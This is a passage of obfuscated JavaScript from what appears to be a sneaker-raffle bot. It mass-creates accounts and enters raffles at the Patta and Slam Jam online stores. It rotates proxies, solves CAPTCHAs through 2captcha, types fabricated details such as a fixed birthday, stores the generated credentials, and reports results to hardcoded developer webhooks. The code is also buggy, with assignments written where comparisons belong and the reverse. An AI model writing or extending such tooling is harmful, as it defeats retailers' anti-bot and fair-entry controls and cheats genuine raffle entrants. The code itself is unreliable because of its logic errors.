                                        }), _0x48d570['once']('error', function (_0x47ad70) {
                                            console['log']('Fetch\x20error:\x20' + _0x47ad70);
                                        }), _0x48d570['once']('end', function () {
                                            _0x538475['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x538475['once']('error', function (_0x221817) {
                            console['log'](_0x221817);
                        }), _0x538475['once']('end', async function () {
                        }), _0x538475['connect']();
                    }
                    async function _0x5db696(_0x49038b, _0x40a2ac, _0x27c8cf) {
                        for (var _0x36347a = 0x0; _0x36347a < _0x40a2ac['length']; _0x36347a++) {
                            async function _0x2e332a(_0x4d816b, _0x34fd17, _0x3cdf5d, _0x41f289, _0x5532b6) {
                                var _0x3b7d65, _0x169634 = {}, _0x5c2f4e = [], _0x2b127f = {}, _0x1d407e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x22ff3e = Math['round'](Math['random']() * (_0x1d407e['length'] - 0x1));
                                _0x41f289[_0x4d816b]['Size'] == 'RANDOM' && (_0x41f289[_0x4d816b]['Size'] = _0x1d407e[_0x22ff3e]);
                                !_0x41f289 && (_0x41f289 = {});
                                if (_0x37b240['useRandomProxy'] = ![])
                                    var _0x462bc9 = _0x5532b6[_0x4d816b]['split'](':');
                                else
                                    var _0x22a31c = Math['round'](Math['random']() * (_0x5532b6['length'] - 0x1)), _0x462bc9 = _0x5532b6[_0x22a31c]['split'](':');
                                var _0x130a05 = {
                                    'jar': _0x1945a2,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3cdf5d['url'],
                                    'headers': _0x3cdf5d['headers'],
                                    'body': JSON['stringify'](_0x169634),
                                    'proxy': 'http://' + _0x462bc9[0x2] + ':' + _0x462bc9[0x3] + '@' + _0x462bc9[0x0] + ':' + _0x462bc9[0x1]
                                };
                                return _0x34fd17 != 'ver' && (_0x130a05['url'] = _0x3cdf5d['url'], _0x130a05['headers'] = _0x3cdf5d['headers']), _0x34fd17 == 'ver' && (_0x130a05['method'] = 'GET', _0x130a05['url'] = _0x41f289[_0x4d816b]), new Promise(function (_0x37a73a, _0x8ed80c) {
                                    callback = async (_0x456c3c, _0x4177a0, _0x568c43) => {
                                        if (!_0x456c3c && _0x4177a0['statusCode'] == 0xca || !_0x456c3c && _0x4177a0['statusCode'] == 0xc8) {
                                            if (_0x34fd17 != 'ver') {
                                                var _0x120de0 = await _0xb1aeae(_0x41f289[_0x4d816b], _0x3cdf5d, 'dev', ![]), _0x40708e = await _0xb1aeae(_0x41f289[_0x4d816b], _0x3cdf5d, 'pub', ![]);
                                                const _0x27b00f = {
                                                    'succesDEVMSG': { 'embeds': [_0x120de0] },
                                                    'succesPUBMSG': { 'embeds': [_0x40708e] }
                                                };
                                                if (_0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '')
                                                    try {
                                                        await _0x40545a(_0x37b240['webhook'], _0x27b00f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x28bb81(0xc8), await _0x40545a(_0x1efb60, _0x27b00f['succesDEVMSG']), await _0x28bb81(0xc8);
                                                try {
                                                    await _0x40545a(_0x4a9ac0, _0x27b00f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4d8543(_0x41f289[_0x4d816b], _0x3cdf5d);
                                            }
                                            _0x37a73a(console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x3cdf5d['name'] + ']\x20Task\x20' + (_0x4d816b + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x34fd17 != 'ver') {
                                                var _0x843118 = '' + _0x456c3c, _0x5b629f = await _0xb1aeae(_0x41f289[_0x4d816b], _0x3cdf5d, 'dev', !![], _0x843118), _0x6159e7 = {};
                                                _0x6159e7['errorDEV'] = { 'embeds': [_0x5b629f] }, _0x1322f8(_0x41f289[_0x4d816b], _0x3cdf5d), _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x6159e7['errorDEV']), await _0x40545a(_0x2b1b7c, _0x6159e7['errorDEV']);
                                            }
                                            _0x8ed80c(console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x3cdf5d['name'] + ']\x20Task\x20' + (_0x4d816b + 0x1) + ':\x20' + _0x456c3c)));
                                        }
                                    };
                                    try {
                                        _0x34fd17 != 'ver' ? console['log'](_0x51d312() + '\x20[' + _0x3cdf5d['name'] + ']\x20Task\x20' + (_0x4d816b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x169634['data']['attributes']['email']) : console['log'](_0x51d312() + '\x20[' + _0x3cdf5d['name'] + ']\x20Task\x20' + (_0x4d816b + 0x1) + ':\x20Fetching\x20Response'), _0x1f14da(_0x130a05, callback);
                                    } catch (_0x4dcf91) {
                                        console['log'](_0x51d312() + '\x20Task\x20' + (_0x4d816b + 0x1) + ':\x20' + _0x4dcf91);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x2e332a(_0x36347a, 'ver', _0x49038b, _0x40a2ac, _0x27c8cf), console['log'](_0x51d312() + '\x20[' + _0x49038b['name'] + ']\x20Sleeping\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                            } catch (_0x1cedb6) {
                            }
                        }
                    }
                    try {
                        _0x15a848(), await _0x28bb81(0xfa0), console['log']('Found\x20' + _0xc354db['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5db696(_0x298159, _0xc354db, _0x3a6330);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1d30bd, _0x1be773, _0x3cebf9) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3519e8 = 0x0; _0x3519e8 < _0x1be773['length']; _0x3519e8++) {
                        var _0x2fe82b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x340f37
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37b240['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2de2a3
                                }
                            ]
                        }];
                        const _0x35534b = { 'embeds': _0x2fe82b };
                        _0x50109a(_0x1d30bd['name'] + '\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20/\x20' + _0x1be773['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x1be773, _0x3519e8);
                        var _0x11f751 = await _0xb1aeae(_0x1be773[_0x3519e8], _0x1d30bd, 'acc', ![]);
                        const _0x422090 = { 'succesDEVMSG': { 'embeds': [_0x11f751] } };
                        if (_0x1be773[_0x3519e8]['Email'] == '' || _0x1be773[_0x3519e8]['FirstName'] == '' || _0x1be773[_0x3519e8]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x28bb81(0x7d0);
                            continue;
                        }
                        (_0x1be773[_0x3519e8]['Password'] == '' || _0x1be773[_0x3519e8] == undefined) && _0x1be773[_0x3519e8]['Password'] == 'JRaffles23!';
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x371f57 = _0x3cebf9[_0x3519e8]['split'](':');
                        else
                            var _0x4f4920 = Math['round'](Math['random']() * (_0x3cebf9['length'] - 0x1)), _0x371f57 = _0x3cebf9[_0x4f4920]['split'](':');
                        const _0x3c208b = await _0x3b2a97['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x371f57[0x0] + ':' + _0x371f57[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x3bd4ae = await _0x3c208b['newPage']();
                            await _0x3bd4ae['authenticate']({
                                'username': '' + _0x371f57[0x2],
                                'password': '' + _0x371f57[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x1d30bd['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3bd4ae['setRequestInterception'](!![]), _0x3bd4ae['on']('request', _0x4a70f8 => {
                                _0x4a70f8['resourceType']() === 'image' || _0x4a70f8['resourceType']() === 'font' || _0x4a70f8['resourceType']() === 'media' ? _0x4a70f8['abort']() : _0x4a70f8['continue']();
                            }), await _0x3bd4ae['goto']('https://patta.nl/account/register'), await _0x28bb81(0xbb8), await _0x3bd4ae['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x51d312() + '\x20[' + _0x1d30bd['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Filling\x20information'), await _0x3bd4ae['type']('#RegisterForm-FirstName', '' + _0x1be773[_0x3519e8]['FirstName']), await _0x28bb81(0x226), await _0x3bd4ae['type']('#RegisterForm-LastName', '' + _0x1be773[_0x3519e8]['LastName']), await _0x28bb81(0x226), await _0x3bd4ae['type']('#RegisterForm-email', '' + _0x1be773[_0x3519e8]['Email']), await _0x28bb81(0x226), await _0x3bd4ae['type']('#RegisterForm-password', '' + _0x1be773[_0x3519e8]['Password']), await _0x28bb81(0x226), console['log'](_0x51d312() + '\x20[' + _0x1d30bd['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Submitting..'), await _0x3bd4ae['$eval']('#RegisterForm', _0x460330 => _0x460330['submit']()), await _0x28bb81(0x1f40);
                            try {
                                await _0x3bd4ae['waitForSelector']('.home-page-grid__collection'), await _0x28bb81(0x1f4), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x1d30bd['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Account\x20' + _0x1be773[_0x3519e8]['Email'] + '\x20Generated!')), _0x5e446e['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x1be773[_0x3519e8]['Email'] + ',' + _0x1be773[_0x3519e8]['Password']), console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x1d30bd['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Account\x20' + _0x1be773[_0x3519e8]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x422090['succesDEVMSG']);
                                } catch {
                                }
                                await _0x40545a(_0x14be92, _0x422090['succesDEVMSG']);
                            } catch (_0x11fd06) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x11fd06));
                            }
                        } catch (_0x2be778) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3519e8 + 0x1) + '\x20:\x20' + _0x2be778));
                        } finally {
                            _0x3c208b && _0x3c208b['close'](), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0xd22ddc, _0x4c64b5, _0x351902) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x33a520 = 0x0; _0x33a520 < _0x4c64b5['length']; _0x33a520++) {
                        var _0x38352a;
                        if (_0x195572 != 'yes')
                            var _0x195572 = '', _0x562823 = 0x0;
                        _0x50109a(_0xd22ddc['name'] + '\x20Task\x20' + (_0x33a520 + 0x1) + '\x20/\x20' + _0x4c64b5['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x4c64b5, _0x33a520);
                        if (_0x4c64b5[_0x33a520]['Email'] == '' || _0x4c64b5[_0x33a520]['Password'] == '' || _0x4c64b5[_0x33a520]['FirstName'] == '' || _0x4c64b5[_0x33a520]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x73250d = _0x351902[_0x33a520]['split'](':');
                        else
                            var _0xd22a75 = Math['round'](Math['random']() * (_0x351902['length'] - 0x1)), _0x73250d = _0x351902[_0xd22a75]['split'](':');
                        const _0x1bc760 = await _0x3b2a97['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x73250d[0x0] + ':' + _0x73250d[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4761e2 = await _0x1bc760['newPage']();
                            await _0x4761e2['authenticate']({
                                'username': '' + _0x73250d[0x2],
                                'password': '' + _0x73250d[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4761e2['setRequestInterception'](!![]), _0x4761e2['on']('request', _0x5b2f2c => {
                                _0x5b2f2c['resourceType']() === 'image' || _0x5b2f2c['resourceType']() === 'font' || _0x5b2f2c['resourceType']() === 'media' ? _0x5b2f2c['abort']() : _0x5b2f2c['continue']();
                            }), await _0x4761e2['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4761e2['waitForSelector']('#CustomerEmail'), console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x4761e2['type']('#CustomerEmail', '' + _0x4c64b5[_0x33a520]['Email']), await _0x28bb81(0x12c), await _0x4761e2['type']('#CustomerPassword', '' + _0x4c64b5[_0x33a520]['Password']), await _0x28bb81(0x226), await _0x4761e2['$eval']('#customer_login', _0x3ecac0 => _0x3ecac0['submit']());
                            try {
                                await _0x4761e2['waitForSelector']('#orders'), await _0x28bb81(0x4b0);
                            } catch {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x4761e2['goto']('' + _0x4c64b5[_0x33a520]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x28bb81(0xbb8), console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x4761e2['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x4761e2['type']('#email', '' + _0x4c64b5[_0x33a520]['Email']), await _0x28bb81(0x384), await _0x4761e2['type']('#first_name', '' + _0x4c64b5[_0x33a520]['FirstName']), await _0x28bb81(0x514), await _0x4761e2['type']('#last_name', '' + _0x4c64b5[_0x33a520]['LastName']), await _0x28bb81(0x514), await _0x4761e2['type']('#street_address', _0x4c64b5[_0x33a520]['Address1'] + '\x20' + _0x4c64b5[_0x33a520]['HouseNumber'] + '\x20' + _0x4c64b5[_0x33a520]['Address2']), await _0x28bb81(0x2bc);
                            _0x4c64b5[_0x33a520]['Postcode'] == undefined && (_0x4c64b5[_0x33a520]['Postcode'] = _0x4c64b5[_0x33a520]['Zip']);
                            await _0x4761e2['type']('#zip_code', '' + _0x4c64b5[_0x33a520]['Postcode']), await _0x28bb81(0x320), await _0x4761e2['type']('#city', '' + _0x4c64b5[_0x33a520]['City']), await _0x28bb81(0x320), await _0x4761e2['type']('#bday', '01/01/1994'), await _0x28bb81(0x320), await _0x4761e2['type']('#instagram', '' + _0x4c64b5[_0x33a520]['Follower']), await _0x28bb81(0x352);
                            if (_0x4c64b5[_0x33a520]['Size'] == 'RANDOM') {
                                const _0x5ebf53 = await _0x4761e2['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x2fe97a => {
                                    return _0x2fe97a['map'](_0x2aded8 => _0x2aded8['textContent']);
                                });
                                var _0x4876c6 = Math['round'](Math['random']() * (_0x5ebf53['length'] - 0x1));
                                console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x5ebf53[_0x4876c6]), await _0x4761e2['click']('label[data-eu-size=\x22' + _0x5ebf53[_0x4876c6] + '\x22]');
                            } else {
                                console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x4c64b5[_0x33a520]['Size']);
                                try {
                                    await _0x4761e2['click']('label[data-eu-size=\x22' + _0x4c64b5[_0x33a520]['Size'] + '\x22]');
                                } catch {
                                    await _0x4761e2['click']('label[data-eu-size=\x22' + _0x4c64b5[_0x33a520]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x28bb81(0xbb8), await _0x4761e2['$$eval']('.raffle__checkbox-label', _0xff92db => _0xff92db['forEach'](_0x6d3824 => _0x6d3824['click']())), await _0x28bb81(0x7d0), console['log'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x4761e2['click']('#raffle__form-submit'), await _0x28bb81(0x1388);
                            try {
                                await _0x4761e2['waitForSelector']('#raffle__confirmation-message-container'), _0x195572 = 'no', _0x4d8543(_0x4c64b5[_0x33a520], _0xd22ddc), console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4be0c4) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x4be0c4));
                            }
                        } catch (_0x121c15) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20' + _0x121c15)), _0x195572 = 'yes';
                        } finally {
                            _0x1bc760 && _0x1bc760['close']();
                            if (_0x195572 == 'yes' && _0x562823 != 0x5 && _0x38352a != 'Size\x20Not\x20Found') {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0xd22ddc['name'] + ']\x20Task\x20' + (_0x33a520 + 0x1) + '\x20:\x20Retrying')), _0x33a520 = _0x33a520 - 0x1, _0x562823 = _0x562823 + 0x1;
                                continue;
                            }
                            _0x195572 == 'yes' && _0x562823 >= 0x5 && (_0x1322f8(_0x4c64b5[_0x33a520], _0xd22ddc), _0x195572 = 'no', _0x562823 = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x586849, _0x8d474a, _0x20915a) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3f22b0 = 0x0; _0x3f22b0 < _0x8d474a['length']; _0x3f22b0++) {
                        if (_0x15344d != 'yes')
                            var _0x15344d = '', _0x2a55e4 = 0x0;
                        var _0x3b52db = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x340f37
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x37b240['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2de2a3
                                }
                            ]
                        }];
                        const _0x48822a = { 'embeds': _0x3b52db };
                        _0x50109a(_0x586849['name'] + '\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20/\x20' + _0x8d474a['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x8d474a, _0x3f22b0);
                        var _0x4a9216 = await _0xb1aeae(_0x8d474a[_0x3f22b0], _0x586849, 'acc', ![]);
                        const _0x13a480 = { 'succesDEVMSG': { 'embeds': [_0x4a9216] } };
                        if (_0x8d474a[_0x3f22b0]['Email'] == '' || _0x8d474a[_0x3f22b0]['FirstName'] == '' || _0x8d474a[_0x3f22b0]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x28bb81(0x7d0);
                            continue;
                        }
                        (_0x8d474a[_0x3f22b0]['Password'] == '' || _0x8d474a[_0x3f22b0] == undefined) && _0x8d474a[_0x3f22b0]['Password'] == 'JRaffles23!';
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x5cba06 = _0x20915a[_0x3f22b0]['split'](':');
                        else
                            var _0x61e1c5 = Math['round'](Math['random']() * (_0x20915a['length'] - 0x1)), _0x5cba06 = _0x20915a[_0x61e1c5]['split'](':');
                        const _0xf15508 = await _0x3b2a97['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5cba06[0x0] + ':' + _0x5cba06[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x4d694d = await _0xf15508['newPage']();
                            await _0x4d694d['authenticate']({
                                'username': '' + _0x5cba06[0x2],
                                'password': '' + _0x5cba06[0x3]
                            }), console['log'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d694d['setRequestInterception'](!![]), _0x4d694d['on']('request', _0x1874a7 => {
                                _0x1874a7['resourceType']() === 'image' || _0x1874a7['resourceType']() === 'font' || _0x1874a7['resourceType']() === 'media' ? _0x1874a7['abort']() : _0x1874a7['continue']();
                            }), await _0x4d694d['goto']('https://drop.slamjam.com/account/register'), await _0x28bb81(0xbb8), await _0x4d694d['waitForSelector']('#FirstName'), await _0x4d694d['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4d694d['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Filling\x20information'), await _0x28bb81(0x4b0), await _0x4d694d['type']('#FirstName', '' + _0x8d474a[_0x3f22b0]['FirstName']), await _0x28bb81(0x226), await _0x4d694d['type']('#LastName', '' + _0x8d474a[_0x3f22b0]['LastName']), await _0x28bb81(0x226), await _0x4d694d['type']('#Email', '' + _0x8d474a[_0x3f22b0]['Email']), await _0x28bb81(0x2ee), await _0x4d694d['type']('#ConfirmEmail', '' + _0x8d474a[_0x3f22b0]['Email']), await _0x28bb81(0x2ee), await _0x4d694d['type']('#CreatePassword', '' + _0x8d474a[_0x3f22b0]['Password']), await _0x28bb81(0x2ee), await _0x4d694d['type']('#CreateConfirmPassword', '' + _0x8d474a[_0x3f22b0]['Password']), await _0x28bb81(0x226), console['log'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Submitting..'), await _0x4d694d['$eval']('#create_customer', _0x419af2 => _0x419af2['submit']()), await _0x28bb81(0x1388), console['log'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20' + _0x2367c9['cyan']('Solving\x20Captcha')), await _0x4d694d['solveRecaptchas'](), console['log'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x4d694d['$eval']('.shopify-challenge__container\x20>\x20form', _0x5d630f => _0x5d630f['submit']());
                            try {
                                await _0x4d694d['waitForSelector']('.product-card__image'), await _0x28bb81(0x1f4), _0x15344d = 'no', console['log'](_0x2367c9['green'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Account\x20' + _0x8d474a[_0x3f22b0]['Email'] + '\x20Generated!')), _0x5e446e['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x8d474a[_0x3f22b0]['Email'] + ',' + _0x8d474a[_0x3f22b0]['Password']), console['log'](_0x2367c9['yellow'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Account\x20' + _0x8d474a[_0x3f22b0]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x37b240['webhook'] != undefined && _0x37b240['webhook'] != '' && await _0x40545a(_0x37b240['webhook'], _0x13a480['succesDEVMSG']);
                                } catch {
                                }
                                await _0x40545a(_0x14be92, _0x13a480['succesDEVMSG']);
                            } catch (_0x37142d) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x37142d));
                            }
                        } catch (_0xe38edf) {
                            console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x57cc5d[taskModule]['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20' + _0xe38edf));
                        } finally {
                            _0xf15508 && _0xf15508['close']();
                            if (_0x15344d == 'yes' && _0x2a55e4 != 0x5) {
                                console['log'](_0x2367c9['red'](_0x51d312() + '\x20[' + _0x586849['name'] + ']\x20Task\x20' + (_0x3f22b0 + 0x1) + '\x20:\x20Retrying')), _0x3f22b0 = _0x3f22b0 - 0x1, _0x2a55e4 = _0x2a55e4 + 0x1;
                                continue;
                            }
                            _0x15344d == 'yes' && _0x2a55e4 >= 0x5 && (_0x1322f8(_0x8d474a[_0x3f22b0], _0x586849), _0x15344d = 'no', _0x2a55e4 = 0x0), console['log']('Waiting\x20for\x20' + _0x37b240['delay'] + '\x20ms'), await _0x28bb81(_0x37b240['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x53bf1b, _0x429256, _0x498b81) {
                    _0x3b2a97['use'](_0x2b8567()), _0x3b2a97['use'](_0x5af5b0({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37b240['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x31bce5 = 0x0; _0x31bce5 < _0x429256['length']; _0x31bce5++) {
                        var _0x183d7c;
                        if (_0x2c75d3 != 'yes')
                            var _0x2c75d3 = '', _0x5a5448 = 0x0;
                        _0x50109a(_0x53bf1b['name'] + '\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20/\x20' + _0x429256['length'] + '\x20||\x20File:\x20' + _0x4f3156 + '\x20Proxies:\x20' + _0x397c57), await _0x129938(_0x429256, _0x31bce5);
                        if (_0x429256[_0x31bce5]['Email'] == '' || _0x429256[_0x31bce5]['Password'] == '' || _0x429256[_0x31bce5]['FirstName'] == '' || _0x429256[_0x31bce5]['LastName'] == '') {
                            console['log'](_0x51d312() + '\x20[' + _0x53bf1b['name'] + ']\x20Task\x20' + (_0x31bce5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37b240['useRandomProxy'] = ![])
                            var _0x37d730 = _0x498b81[_0x31bce5]['split'](':');
                        else
                            var _0xcd64bb = Math['round'](Math['random']() * (_0x498b81['length'] - 0x1)), _0x37d730 = _0x498b81[_0xcd64bb]['split'](':');
                        const _0x1f87e4 = await _0x3b2a97['launch']({
                            'headless': !![],
